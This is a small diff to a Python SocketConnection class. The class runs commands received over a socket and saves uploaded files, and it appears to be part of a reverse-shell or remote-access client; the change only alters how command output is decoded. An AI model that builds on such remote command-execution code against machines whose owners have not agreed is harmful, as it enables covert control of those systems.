@@ -62,7 +62,7 @@ class SocketConnection:
                 elif command[0] == "upload":
                     command_output = self.save_file(command[1],command[2])
                 else:
-                    command_output = self.command_execution(command).decode()
+                    command_output = self.command_execution(command)
             except Exception:
                     command_output = "Error!!"
 
